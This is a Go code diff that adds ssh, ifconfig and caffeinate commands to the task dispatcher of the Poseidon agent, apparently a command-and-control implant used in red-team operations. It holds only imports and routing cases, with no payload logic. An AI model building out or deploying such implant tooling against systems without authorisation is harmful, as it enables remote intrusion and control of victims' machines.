@@ -1,6 +1,7 @@
 package tasks
 
 import (
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/caffeinate"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/clipboard"
@@ -14,6 +15,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/head"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ifconfig"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
@@ -47,6 +49,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ssh"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sudo"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tail"
@@ -189,6 +192,12 @@ func listenForNewTask() {
 			go shell.RunConfig(task)
 		case "config":
 			go config.Run(task)
+		case "ssh":
+			go ssh.Run(task)
+		case "ifconfig":
+			go ifconfig.Run(task)
+		case "caffeinate":
+			go caffeinate.Run(task)
 		default:
 			// No tasks, do nothing
 			break
